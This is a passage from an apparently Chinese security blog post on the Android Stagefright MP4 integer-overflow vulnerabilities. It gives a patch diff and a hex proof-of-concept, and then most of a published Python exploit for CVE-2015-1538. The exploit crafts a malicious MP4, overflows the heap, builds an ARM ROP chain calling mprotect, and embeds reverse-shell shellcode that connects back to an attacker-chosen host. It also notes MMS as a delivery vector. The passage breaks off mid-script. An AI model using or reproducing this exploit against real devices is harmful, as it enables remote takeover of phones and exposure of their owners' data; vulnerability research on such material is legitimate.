class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typed_data</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">uint32_t</span> mType;</span><br><span class="line">    <span class="keyword">size_t</span> mSize;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> *ext_data;</span><br><span class="line">        <span class="keyword">float</span> reservoir;</span><br><span class="line">    &#125; u;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">usesReservoir</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mSize &lt;= <span class="keyword">sizeof</span>(u.reservoir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">allocateStorage</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">freeStorage</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> *<span class="title">storage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> usesReservoir() ? &amp;u.reservoir : u.ext_data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="keyword">void</span> *<span class="title">storage</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> usesReservoir() ? &amp;u.reservoir : u.ext_data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看起来是off-by-one，off-by-one咋利用来着：</p><ul><li>修改元数据，比如ptmalloc的chunck的size的PRE_ISSUE位覆盖为0</li><li>打印可以信息泄露</li><li>可以覆盖指针的低字节</li></ul><h2 id="漏洞点（真）"><a href="#漏洞点（真）" class="headerlink" title="漏洞点（真）"></a>漏洞点（真）</h2><p>看一下patch：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-330</span>,<span class="number">7</span> +<span class="number">330</span>,<span class="number">7</span> @@</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mTimeToSampleCount = U32_AT(&amp;header[<span class="number">4</span>]);</span><br><span class="line">-    <span class="keyword">uint64_t</span> allocSize = mTimeToSampleCount * <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">+    <span class="keyword">uint64_t</span> allocSize = mTimeToSampleCount * <span class="number">2</span> * (<span class="keyword">uint64_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (allocSize &gt; SIZE_MAX) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_OUT_OF_RANGE;</span><br><span class="line">    &#125;</span><br><span class="line">@@ <span class="number">-376</span>,<span class="number">7</span> +<span class="number">376</span>,<span class="number">7</span> @@</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mNumCompositionTimeDeltaEntries = numEntries;</span><br><span class="line">-    <span class="keyword">uint64_t</span> allocSize = numEntries * <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">+    <span class="keyword">uint64_t</span> allocSize = numEntries * <span class="number">2</span> * (<span class="keyword">uint64_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (allocSize &gt; SIZE_MAX) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_OUT_OF_RANGE;</span><br><span class="line">    &#125;</span><br><span class="line">@@ <span class="number">-426</span>,<span class="number">7</span> +<span class="number">426</span>,<span class="number">7</span> @@</span><br><span class="line">        ALOGV(<span class="string">"Table of sync samples is empty or has only a single entry!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">-    <span class="keyword">uint64_t</span> allocSize = mNumSyncSamples * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">+    <span class="keyword">uint64_t</span> allocSize = mNumSyncSamples * (<span class="keyword">uint64_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (allocSize &gt; SIZE_MAX) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_OUT_OF_RANGE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>int32跟int32相乘时候，会产生溢出，都转成int64就没问题了。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造POC，我们设mTimeToSampleCount <em> 2 </em> 4 = 0xFFFFFFFF + 0x1可得，mTimeToSampleCount＝0x20000000 我们以mTimeToSampleCount＝0x20000000构造的一个POC如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk_size(4字节)   ---- 00 00 00 18</span><br><span class="line"><span class="string">"stts"</span>(chunk_type)  ---- 73 74 74 73</span><br><span class="line">unknown(4字节)      ---- 00 00 00 00</span><br><span class="line">mTimeToSampleCount  ---- 20 00 00 00</span><br></pre></td></tr></table></figure><p>下面是exp。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Joshua J. Drake (@jduck) of ZIMPERIUM zLabs</span></span><br><span class="line"><span class="comment"># Shout outs to our friends at Optiv (formerly Accuvant Labs)</span></span><br><span class="line"><span class="comment"># (C) Joshua J. Drake, ZIMPERIUM Inc, Mobile Threat Protection, 2015</span></span><br><span class="line"><span class="comment"># www.zimperium.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit for RCE Vulnerability CVE-2015-1538 #1</span></span><br><span class="line"><span class="comment"># Integer Overflow in the libstagefright MP4 'stsc' atom handling</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don't forget, the output of "create_mp4" can be delivered many ways!</span></span><br><span class="line"><span class="comment"># MMS is the most dangerous attack vector, but not the only one...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># DISCLAIMER: This exploit is for testing and educational purposes only. Any</span></span><br><span class="line"><span class="comment"># other usage for this code is not allowed. Use at your own risk.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># "With great power comes great responsibility." - Uncle Ben</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Creates a single MP4 atom - LEN, TAG, DATA</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_chunk</span><span class="params">(tag, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(tag) != <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">raise</span> <span class="string">'Yo! They call it "FourCC" for a reason.'</span></span><br><span class="line">    ret = struct.pack(<span class="string">'&gt;L'</span>, len(data) + <span class="number">8</span>)</span><br><span class="line">    ret += tag</span><br><span class="line">    ret += data</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stco' atom - Sample Table Chunk Offets</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stco</span><span class="params">(extra=<span class="string">''</span>)</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mNumChunkOffsets</span></span><br><span class="line">    <span class="keyword">return</span> make_chunk(<span class="string">'stco'</span>, ret+extra)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stsz' atom - Sample Table Size</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stsz</span><span class="params">(extra=<span class="string">''</span>)</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mDefaultSampleSize</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mNumSampleSizes</span></span><br><span class="line">    <span class="keyword">return</span> make_chunk(<span class="string">'stsz'</span>, ret+extra)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stts' atom - Sample Table Time-to-Sample</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stts</span><span class="params">()</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># mTimeToSampleCount</span></span><br><span class="line">    <span class="keyword">return</span> make_chunk(<span class="string">'stts'</span>, ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This creates a single Sample Table Sample-to-Chunk entry</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stsc_entry</span><span class="params">(start, per, desc)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, start + <span class="number">1</span>)</span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, per)</span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, desc)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Make an 'stsc' chunk - Sample Table Sample-to-Chunk</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If the caller desires, we will attempt to trigger (CVE-2015-1538 #1) and</span></span><br><span class="line"><span class="comment"># cause a heap overflow.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_stsc</span><span class="params">(num_alloc, num_write, sp_addr=<span class="number">0x42424242</span>, do_overflow = False)</span>:</span></span><br><span class="line">    ret =  struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) <span class="comment"># version/flags</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># this is the clean version...</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> do_overflow:</span><br><span class="line">        ret += struct.pack(<span class="string">'&gt;L'</span>, num_alloc) <span class="comment"># mNumSampleToChunkOffsets</span></span><br><span class="line">        ret += <span class="string">'Z'</span> * (<span class="number">12</span> * num_alloc)</span><br><span class="line">        <span class="keyword">return</span> make_chunk(<span class="string">'stsc'</span>, ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now the explicit version. (trigger the bug)</span></span><br><span class="line">    ret += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0xc0000000</span> + num_alloc) <span class="comment"># mNumSampleToChunkOffsets</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill in the entries that will overflow the buffer</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, num_write):</span><br><span class="line">        ret += make_stsc_entry(sp_addr, sp_addr, sp_addr)</span><br><span class="line"></span><br><span class="line">    ret = make_chunk(<span class="string">'stsc'</span>, ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># patch the data_size</span></span><br><span class="line">    ret = struct.pack(<span class="string">'&gt;L'</span>, <span class="number">8</span> + <span class="number">8</span> + (num_alloc * <span class="number">12</span>)) + ret[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Build the ROP chain</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ROP pivot by Georg Wicherski! Thanks!</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(gdb) x/10i __dl_restore_core_regs</span></span><br><span class="line"><span class="string">   0xb0002850 &lt;__dl_restore_core_regs&gt;: add r1, r0, #52 ; 0x34</span></span><br><span class="line"><span class="string">   0xb0002854 &lt;__dl_restore_core_regs+4&gt;:   ldm r1, &#123;r3, r4, r5&#125;</span></span><br><span class="line"><span class="string">   0xb0002858 &lt;__dl_restore_core_regs+8&gt;:   push    &#123;r3, r4, r5&#125;</span></span><br><span class="line"><span class="string">   0xb000285c &lt;__dl_restore_core_regs+12&gt;:  ldm r0, &#123;r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11&#125;</span></span><br><span class="line"><span class="string">   0xb0002860 &lt;__dl_restore_core_regs+16&gt;:  ldm sp, &#123;sp, lr, pc&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">b0001144 &lt;__dl_mprotect&gt;:</span></span><br><span class="line"><span class="string">b0001144:       e92d0090        push    &#123;r4, r7&#125;</span></span><br><span class="line"><span class="string">b0001148:       e3a0707d        mov     r7, #125        ; 0x7d</span></span><br><span class="line"><span class="string">b000114c:       ef000000        svc     0x00000000</span></span><br><span class="line"><span class="string">b0001150:       e8bd0090        pop     &#123;r4, r7&#125;</span></span><br><span class="line"><span class="string">b0001154:       e1b00000        movs    r0, r0</span></span><br><span class="line"><span class="string">b0001158:       512fff1e        bxpl    lr</span></span><br><span class="line"><span class="string">b000115c:       ea0015cc        b       b0006894 &lt;__dl_raise+0x10&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span><span class="params">(off, sp_addr, newpc_val, cb_host, cb_port)</span>:</span></span><br><span class="line">    rop = <span class="string">''</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off + <span class="number">0x10</span>) <span class="comment"># new sp</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xb0002a98</span>)           <span class="comment"># new lr - pop &#123;pc&#125;</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xb00038b2</span>+<span class="number">1</span>)         <span class="comment"># new pc: pop &#123;r0, r1, r2, r3, r4, pc&#125;</span></span><br><span class="line"></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, sp_addr &amp; <span class="number">0xfffff000</span>) <span class="comment"># new r0 - base address (page aligned)</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0x1000</span>)               <span class="comment"># new r1 - length</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">7</span>)                    <span class="comment"># new r2 - protection</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xd000d003</span>)           <span class="comment"># new r3 - scratch</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xd000d004</span>)           <span class="comment"># new r4 - scratch</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xb0001144</span>)           <span class="comment"># new pc - _dl_mprotect</span></span><br><span class="line"></span><br><span class="line">    native_start = sp_addr + <span class="number">0x80</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, native_start)         <span class="comment"># address of native payload</span></span><br><span class="line">    <span class="comment">#rop += struct.pack('&lt;L', 0xfeedfed5)          # top of stack...</span></span><br><span class="line">    <span class="comment"># linux/armle/shell_reverse_tcp (modified to pass env and fork/exit)</span></span><br><span class="line">    buf =  <span class="string">''</span></span><br><span class="line">    <span class="comment"># fork</span></span><br><span class="line">    buf += <span class="string">'\x02\x70\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># continue if not parent...</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x50\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x02\x00\x00\x0a'</span></span><br><span class="line">    <span class="comment"># exit parent</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x01\x70\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># setsid in child</span></span><br><span class="line">    buf += <span class="string">'\x42\x70\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># socket/connect/dup2/dup2/dup2</span></span><br><span class="line">    buf += <span class="string">'\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c'</span></span><br><span class="line">    buf += <span class="string">'\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60'</span></span><br><span class="line">    buf += <span class="string">'\xa0\xe1\x6c\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0'</span></span><br><span class="line">    buf += <span class="string">'\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1'</span></span><br><span class="line">    buf += <span class="string">'\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06'</span></span><br><span class="line">    buf += <span class="string">'\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00'</span></span><br><span class="line">    buf += <span class="string">'\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0'</span></span><br><span class="line">    buf += <span class="string">'\xe3\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># execve(shell, argv, env)</span></span><br><span class="line">    buf += <span class="string">'\x30\x00\x8f\xe2\x04\x40\x24\xe0'</span></span><br><span class="line">    buf += <span class="string">'\x10\x00\x2d\xe9\x38\x30\x8f\xe2\x08\x00\x2d\xe9\x0d'</span></span><br><span class="line">    buf += <span class="string">'\x20\xa0\xe1\x10\x00\x2d\xe9\x24\x40\x8f\xe2\x10\x00'</span></span><br><span class="line">    buf += <span class="string">'\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00'</span></span><br><span class="line">    buf += <span class="string">'\xef\x02\x00'</span></span><br><span class="line">    <span class="comment"># Add the connect back host/port</span></span><br><span class="line">    buf += struct.pack(<span class="string">'!H'</span>, cb_port)</span><br><span class="line">    cb_host = socket.inet_aton(cb_host)</span><br><span class="line">    buf += struct.pack(<span class="string">'=4s'</span>, cb_host)</span><br><span class="line">    <span class="comment"># shell -</span></span><br><span class="line">    buf += <span class="string">'/system/bin/sh\x00\x00'</span></span><br><span class="line">    <span class="comment"># argv -</span></span><br><span class="line">    buf += <span class="string">'sh\x00\x00'</span></span><br><span class="line">    <span class="comment"># env -</span></span><br><span class="line">    buf += <span class="string">'PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\x00'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add some identifiable stuff, just in case something goes awry...</span></span><br><span class="line">    rop_start_off = <span class="number">0x34</span></span><br><span class="line">    x = rop_start_off + len(rop)</span><br><span class="line">    <span class="keyword">while</span> len(rop) &lt; <span class="number">0x80</span> - rop_start_off:</span><br><span class="line">        rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xf0f00000</span>+x)</span><br><span class="line">        x += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the native 